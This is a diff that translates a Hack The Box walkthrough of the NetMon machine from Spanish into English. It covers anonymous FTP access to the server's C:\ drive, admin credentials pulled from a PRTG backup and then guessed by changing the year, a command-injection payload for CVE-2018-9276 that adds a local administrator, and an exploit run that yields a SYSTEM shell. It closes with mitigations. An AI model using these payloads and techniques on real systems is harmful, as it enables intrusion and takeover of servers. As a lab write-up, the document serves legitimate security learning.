@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: NetMon"
 date: 2026-06-13
 draft: false
-description: "Walkthrough completo de la máquina NetMon de Hack The Box. Dificultad Easy, OS Windows Server 2016. FTP anónimo con acceso al sistema de archivos, credenciales en backup de configuración PRTG y escalada a SYSTEM mediante CVE-2018-9276."
+description: "Full walkthrough of the NetMon machine from Hack The Box. Easy difficulty, Windows Server 2016. Anonymous FTP with filesystem access, credentials in a PRTG configuration backup, and escalation to SYSTEM via CVE-2018-9276."
 tags: ["HackTheBox", "Windows", "Easy", "FTP", "PRTG", "CVE-2018-9276", "CommandInjection", "PrivEsc", "netmon", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **NetMon** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows Server 2016**. El FTP anónimo expone el sistema de archivos raíz de Windows, lo que nos permite leer un backup de configuración de PRTG con credenciales en texto claro. Con acceso al panel de administración explotamos CVE-2018-9276, una inyección de comandos en el sistema de notificaciones de PRTG que ejecuta código como **NT AUTHORITY\SYSTEM**.
+Walkthrough of **NetMon** on Hack The Box. **Easy** difficulty machine running **Windows Server 2016**. Anonymous FTP exposes the Windows root filesystem, allowing us to read a PRTG configuration backup with cleartext credentials. With admin panel access we exploit CVE-2018-9276, a command injection in PRTG's notification system that executes code as **NT AUTHORITY\SYSTEM**.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,20 +18,26 @@ Resolución de **NetMon** en Hack The Box. Máquina de dificultad **Easy** con s
 
 ---
 
-## 🗺️ Información de la Máquina
-| Campo          | Detalle                                                              |
+## 🗺️ Machine Info
+
+| Field          | Detail                                                               |
 |----------------|----------------------------------------------------------------------|
-| **Nombre**     | NetMon                                                               |
+| **Name**       | NetMon                                                               |
 | **OS**         | Windows Server 2016                                                  |
-| **Dificultad** | Easy                                                                 |
+| **Difficulty** | Easy                                                                 |
 | **IP**         | 10.129.14.77                                                         |
-| **Técnicas**   | FTP Anonymous Read · Credential Exposure · CVE-2018-9276 · Command Injection |
+| **Techniques** | FTP Anonymous Read · Credential Exposure · CVE-2018-9276 · Command Injection |
+
 ---
-## 1. Reconocimiento
-### 1.1 Escaneo de Puertos
+
+## 1. Reconnaissance
+
+### 1.1 Port Scan
+
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.14.77
 ```
+
 ```
 PORT      STATE SERVICE
 21/tcp    open  ftp
@@ -42,10 +48,13 @@ PORT      STATE SERVICE
 5985/tcp  open  wsman
 47001/tcp open  winrm
 ```
-Escaneo de versiones sobre los puertos relevantes:
+
+Version scan on relevant ports:
+
 ```bash
 nmap -sC -sV -p21,80,5985 10.129.14.77
 ```
+
 ```
 PORT     STATE SERVICE  VERSION
 21/tcp   open  ftp      Microsoft ftpd
@@ -54,16 +63,21 @@ PORT     STATE SERVICE  VERSION
 |_http-title: Welcome | PRTG Network Monitor
 5985/tcp open  http     Microsoft HTTPAPI httpd (WSMAN)
 ```
-*Puertos abiertos:*
-- `21` → FTP con **acceso anónimo habilitado**
-- `80` → **PRTG Network Monitor** — herramienta de monitorización de infraestructura
-- `5985` → WinRM (útil si obtenemos credenciales de administrador)
-> **💡 Dato clave:** PRTG Network Monitor es software con historial de vulnerabilidades críticas. El FTP anónimo en un servidor Windows puede exponer rutas sensibles del sistema de archivos si no está correctamente aislado en un directorio chroot.
-### 1.2 Enumeración FTP — Acceso al Sistema de Archivos
+
+*Open ports:*
+- `21` → FTP with **anonymous access enabled**
+- `80` → **PRTG Network Monitor** — infrastructure monitoring tool
+- `5985` → WinRM (useful if we obtain admin credentials)
+
+> **💡 Key detail:** PRTG Network Monitor has a history of critical vulnerabilities. Anonymous FTP on a Windows server can expose sensitive filesystem paths if not properly isolated in a chroot directory.
+
+### 1.2 FTP Enumeration — Filesystem Access
+
 ```bash
 ftp 10.129.14.77
-# Usuario: anonymous / Sin contraseña
+# Username: anonymous / No password
 ```
+
 ```
 ftp> ls
 02-03-19  12:18AM         .rnd
@@ -74,12 +88,16 @@ ftp> ls
 02-03-19  08:08AM  <DIR>  Users
 11-10-23  10:20AM  <DIR>  Windows
 ```
-El FTP expone el **sistema de archivos raíz de Windows** (`C:\`). Podemos navegar libremente por directorios del sistema sin autenticación — una misconfiguration crítica que convierte el FTP en un vector de lectura de cualquier archivo accesible al proceso.
-La documentación oficial de PRTG indica que los archivos de configuración se almacenan en `C:\ProgramData\Paessler\PRTG Network Monitor`:
+
+The FTP exposes the **Windows root filesystem** (`C:\`). We can freely navigate system directories without authentication — a critical misconfiguration that turns the FTP into a read vector for any file accessible to the process.
+
+PRTG's official documentation states configuration files are stored in `C:\ProgramData\Paessler\PRTG Network Monitor`:
+
 ```bash
 ftp> cd ProgramData/Paessler/PRTG\ Network\ Monitor
 ftp> ls
 ```
+
 ```
 06-13-26  08:17AM  <DIR>   Configuration Auto-Backups
 02-25-19  10:54PM  1189697 PRTG Configuration.dat
@@ -87,63 +105,83 @@ ftp> ls
 07-14-18  03:13AM  1153755 PRTG Configuration.old.bak
 06-13-26  09:41AM  1722335 PRTG Graph Data Cache.dat
 ```
-Hay tres archivos de configuración: el actual (`.dat`), una copia anterior (`.old`) y un backup antiguo (`.old.bak`). Los backups suelen contener información histórica valiosa — credenciales que ya no están en producción pero que revelan patrones. Descargamos el más antiguo:
+
+There are three configuration files: the current one (`.dat`), a previous copy (`.old`), and an old backup (`.old.bak`). Backups often contain valuable historical information — credentials no longer in production but that reveal patterns. We download the oldest one:
+
 ```bash
 ftp> get PRTG\ Configuration.old.bak
 ```
-> **💡 Conclusiones:** Acceso de lectura a todo `C:\` sin autenticación. El backup de configuración de PRTG es el objetivo prioritario — los archivos de configuración de software de monitorización frecuentemente contienen credenciales de administrador en texto claro.
+
+> **💡 Conclusions:** Read access to all of `C:\` without authentication. The PRTG configuration backup is the priority target — monitoring software configuration files frequently contain admin credentials in cleartext.
+
 ---
-## 2. Explotación — Credenciales en Backup y CVE-2018-9276
-### 2.1 Extracción de Credenciales del Backup
+
+## 2. Exploitation — Backup Credentials and CVE-2018-9276
+
+### 2.1 Credential Extraction from the Backup
+
 ```bash
 grep -A2 "dbpassword" "PRTG Configuration.old.bak"
 ```
+
 ```xml
 <dbpassword>
   <!-- User: prtgadmin -->
   PrTg@dmin2018
 ```
-Credenciales encontradas: `prtgadmin:PrTg@dmin2018`. Sin embargo, este backup es de **julio de 2018** y las credenciales actuales del sistema son del año siguiente. PRTG tiene una política de rotación anual, y un patrón tan predecible como incrementar el año hace que la "rotación" sea trivialmente bypasseable:
+
+Credentials found: `prtgadmin:PrTg@dmin2018`. However, this backup is from **July 2018** and the system's current credentials are from the following year. PRTG has an annual rotation policy, and a pattern as predictable as incrementing the year makes the "rotation" trivially bypassable:
+
 ```
-PrTg@dmin2018 → Login fallido
-PrTg@dmin2019 → ✅ Login exitoso
+PrTg@dmin2018 → Login failed
+PrTg@dmin2019 → ✅ Login successful
 ```
-Con `prtgadmin:PrTg@dmin2019` accedemos al panel de administración en `http://10.129.14.77/`.
 
-![Página de login de PRTG Network Monitor](/img/netmon1.png)
+With `prtgadmin:PrTg@dmin2019` we access the admin panel at `http://10.129.14.77/`.
 
-![Dashboard de PRTG tras el login exitoso como administrador](/img/netmon2.png)
+![PRTG Network Monitor login page](/img/netmon1.png)
 
-La versión instalada es **PRTG 18.1.37.13946**, vulnerable al **CVE-2018-9276**.
-### 2.2 Análisis de la Vulnerabilidad — CVE-2018-9276
-PRTG permite configurar notificaciones que ejecutan scripts externos cuando se disparan ciertos eventos. El campo **"Parameter"** de la sección "Execute Program" no sanitiza el input del usuario antes de pasarlo al proceso de ejecución. Usando `;` podemos encadenar comandos adicionales que PRTG ejecutará como **NT AUTHORITY\SYSTEM**.
+![PRTG dashboard after successful login as administrator](/img/netmon2.png)
+
+The installed version is **PRTG 18.1.37.13946**, vulnerable to **CVE-2018-9276**.
+
+### 2.2 Vulnerability Analysis — CVE-2018-9276
+
+PRTG allows configuring notifications that execute external scripts when certain events are triggered. The **"Parameter"** field in the "Execute Program" section doesn't sanitize user input before passing it to the execution process. Using `;` we can chain additional commands that PRTG will execute as **NT AUTHORITY\SYSTEM**.
+
 ```
-Flujo normal:    Parameter: "archivo.txt" → script recibe el argumento → ejecuta acción legítima
-Flujo malicioso: Parameter: "archivo.txt;comando" → script recibe argumento
-                 → PRTG pasa el resto al shell sin sanitizar → comando ejecutado como SYSTEM
+Normal flow:    Parameter: "file.txt" → script receives the argument → performs legitimate action
+Malicious flow: Parameter: "file.txt;command" → script receives argument
+                → PRTG passes the rest to the shell unsanitized → command executed as SYSTEM
 ```
-### 2.3 Explotación Manual — Crear Usuario Administrador
-Navegamos a **Setup → Account Settings → Notifications → Add new notification**:
 
-![Menú Setup → Notifications en PRTG](/img/netmon3.png)
+### 2.3 Manual Exploitation — Create an Admin User
 
-En la sección **"Execute Program"** configuramos:
+Navigate to **Setup → Account Settings → Notifications → Add new notification**:
+
+![Setup → Notifications menu in PRTG](/img/netmon3.png)
+
+In the **"Execute Program"** section configure:
 - **Program File:** `Demo exe notification - outfile.ps1`
 - **Parameter:** `test.txt;net user attacker P@ssw0rd! /add;net localgroup administrators attacker /add`
 
-![Configuración de la notificación maliciosa en PRTG con el comando inyectado en el campo Parameter](/img/netmon4.png)
+![Malicious notification configuration in PRTG with the command injected in the Parameter field](/img/netmon4.png)
 
-El payload encadena tres acciones:
-1. `test.txt` — argumento esperado por el script para que no falle.
-2. `net user attacker P@ssw0rd! /add` — crea un usuario local.
-3. `net localgroup administrators attacker /add` — lo añade al grupo de administradores.
-Guardamos la notificación y la disparamos desde la lista usando el **icono de campana** ("Send test notification"):
+The payload chains three actions:
+1. `test.txt` — argument expected by the script so it doesn't fail.
+2. `net user attacker P@ssw0rd! /add` — creates a local user.
+3. `net localgroup administrators attacker /add` — adds them to the administrators group.
 
-![Lista de notificaciones con el icono Send test notification resaltado](/img/netmon5.png)
+We save the notification and trigger it from the list using the **bell icon** ("Send test notification"):
 
-PRTG ejecuta el script como SYSTEM y los comandos se procesan.
-### 2.4 Shell de SYSTEM con Exploit Automatizado
-Exploit disponible en: [CVE-2018-9276 PoC](https://github.com/BardLaudian/CVE_2018_9276)
+![Notifications list with the Send test notification icon highlighted](/img/netmon5.png)
+
+PRTG executes the script as SYSTEM and the commands are processed.
+
+### 2.4 SYSTEM Shell with Automated Exploit
+
+Exploit available at: [CVE-2018-9276 PoC](https://github.com/BardLaudian/CVE_2018_9276)
+
 ```bash
 python cve_2018_9276.py \
   -i 10.129.14.77 \
@@ -153,45 +191,69 @@ python cve_2018_9276.py \
   --user prtgadmin \
   --password PrTg@dmin2019
 ```
+
 ```
 C:\Windows\system32> whoami
 nt authority\system
 ```
-✅ **Shell de SYSTEM obtenida.**
+
+✅ **SYSTEM shell obtained.**
+
 ---
+
 ## 3. User Flag
-La flag de usuario está en el escritorio público, accesible directamente desde el FTP sin necesidad de shell:
+
+The user flag is on the public desktop, accessible directly from the FTP without needing a shell:
+
 ```bash
 ftp> get Users/Public/Desktop/user.txt
 ```
-> 🔑 Flag de usuario obtenida.
+
+> 🔑 User flag obtained.
+
 ---
+
 ## 4. Root Flag
-Con la shell de SYSTEM navegamos al escritorio del Administrador:
+
+With the SYSTEM shell we navigate to the Administrator's desktop:
+
 ```bash
 C:\Users\Administrator\Desktop> type root.txt
 ```
-> **Nota:** En Windows, el equivalente de `cat` es `type`. No existe de forma nativa en `cmd.exe`.
-> 🏁 Flag de root obtenida.
+
+> **Note:** On Windows, the equivalent of `cat` is `type`. It doesn't natively exist in `cmd.exe`.
+> 🏁 Root flag obtained.
+
 ---
-## 5. Resumen y Lecciones Aprendidas
-**Ruta de compromiso:**
-1. **Recon** → FTP anónimo expone `C:\` completo; puerto 80 sirve PRTG Network Monitor.
-2. **Enumeración FTP** → `C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak` contiene credenciales en texto claro.
-3. **Credenciales** → `prtgadmin:PrTg@dmin2018` del backup; actualización de año → `PrTg@dmin2019` → login exitoso.
-4. **CVE-2018-9276** → Command injection en campo Parameter de notificaciones PRTG → comandos ejecutados como SYSTEM.
-5. **Flags** → User flag via FTP directo; root flag con shell de SYSTEM → `root.txt`.
-**Lo que aprendí con esta máquina:**
-- **FTP anónimo sin chroot en Windows es acceso de lectura a `C:\`.** No hace falta explotar nada — navegar por el FTP equivale a navegar por el explorador de archivos del servidor. Cualquier archivo legible por el proceso FTP está a nuestra disposición, incluidos directorios de aplicaciones con configuración sensible.
-- **Los backups de configuración de software de infraestructura son un objetivo prioritario.** PRTG, Nagios, Zabbix y herramientas similares frecuentemente almacenan credenciales de administrador en sus archivos de configuración para conectarse a los servicios que monitorizan. Si el backup está disponible, suele contener versiones históricas de esas credenciales.
-- **La rotación de contraseñas con patrón predecible no es seguridad.** Cambiar `PrTg@dmin2018` a `PrTg@dmin2019` cumple formalmente con una política de rotación anual, pero cualquier atacante que conozca la contraseña del año anterior puede deducir la actual en segundos. Una rotación efectiva requiere contraseñas aleatorias sin relación entre sí.
-- **CVE-2018-9276 ilustra el riesgo de las herramientas de administración con capacidad de ejecución de scripts.** PRTG necesita ejecutar scripts para sus notificaciones — es una funcionalidad legítima. El problema es no sanitizar el input antes de pasarlo al proceso. Software de monitorización e infraestructura suele correr con privilegios elevados, lo que convierte cualquier inyección de comandos en acceso inmediato a SYSTEM.
-- **Siempre verificar todos los archivos de la misma familia antes de usar las credenciales encontradas.** Había tres versiones del archivo de configuración (`.dat`, `.old`, `.old.bak`). El `.dat` actual podría haber tenido credenciales directamente válidas. El `.old.bak` era el más antiguo y requirió el ajuste del año — haber empezado por el `.dat` podría haber ahorrado ese paso.
-**Mitigaciones:**
-| Vector | Mitigación |
+
+## 5. Summary and Lessons Learned
+
+**Compromise path:**
+
+1. **Recon** → Anonymous FTP exposes all of `C:\`; port 80 serves PRTG Network Monitor.
+2. **FTP enumeration** → `C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak` contains cleartext credentials.
+3. **Credentials** → `prtgadmin:PrTg@dmin2018` from backup; year increment → `PrTg@dmin2019` → successful login.
+4. **CVE-2018-9276** → Command injection in PRTG notifications Parameter field → commands executed as SYSTEM.
+5. **Flags** → User flag via direct FTP; root flag with SYSTEM shell → `root.txt`.
+
+**What I learned from this machine:**
+
+- **Anonymous FTP without chroot on Windows is read access to `C:\`.** No need to exploit anything — navigating the FTP is equivalent to navigating the server's file explorer. Any file readable by the FTP process is at our disposal, including application directories with sensitive configuration.
+
+- **Configuration backups from infrastructure software are a priority target.** PRTG, Nagios, Zabbix, and similar tools frequently store admin credentials in their configuration files to connect to the services they monitor. If a backup is available, it usually contains historical versions of those credentials.
+
+- **Password rotation with a predictable pattern is not security.** Changing `PrTg@dmin2018` to `PrTg@dmin2019` formally fulfills an annual rotation policy, but any attacker who knows the previous year's password can deduce the current one in seconds. Effective rotation requires random passwords with no relationship between them.
+
+- **CVE-2018-9276 illustrates the risk of admin tools with script execution capability.** PRTG needs to execute scripts for its notifications — it's a legitimate feature. The problem is not sanitizing input before passing it to the process. Monitoring and infrastructure software typically runs with elevated privileges, which makes any command injection an immediate path to SYSTEM access.
+
+- **Always check all files of the same family before using found credentials.** There were three versions of the configuration file (`.dat`, `.old`, `.old.bak`). The current `.dat` could have had directly valid credentials. The `.old.bak` was the oldest and required the year adjustment — starting with the `.dat` could have saved that step.
+
+**Mitigations:**
+
+| Vector | Mitigation |
 |--------|------------|
-| FTP anónimo con acceso al raíz del sistema | Deshabilitar el acceso anónimo; si se necesita FTP, aislar en un directorio chroot sin rutas del sistema |
-| Credenciales en texto claro en backups de configuración | Cifrar los backups; eliminar backups antiguos; nunca almacenar contraseñas en texto claro en XML |
-| Rotación de contraseñas con patrón predecible | Usar contraseñas generadas aleatoriamente sin relación entre versiones |
-| CVE-2018-9276 — Command injection en PRTG | Actualizar PRTG a versión 18.2.39 o superior donde el campo Parameter está sanitizado |
-| PRTG ejecutando notificaciones como SYSTEM | Configurar PRTG para ejecutar scripts con un usuario de servicio sin privilegios administrativos |
+| Anonymous FTP with access to system root | Disable anonymous access; if FTP is needed, isolate in a chroot directory without system paths |
+| Cleartext credentials in configuration backups | Encrypt backups; delete old backups; never store passwords in cleartext in XML |
+| Predictable password rotation pattern | Use randomly generated passwords with no relationship between versions |
+| CVE-2018-9276 — Command injection in PRTG | Update PRTG to version 18.2.39 or higher where the Parameter field is sanitized |
+| PRTG executing notifications as SYSTEM | Configure PRTG to execute scripts with an unprivileged service user without administrative privileges |
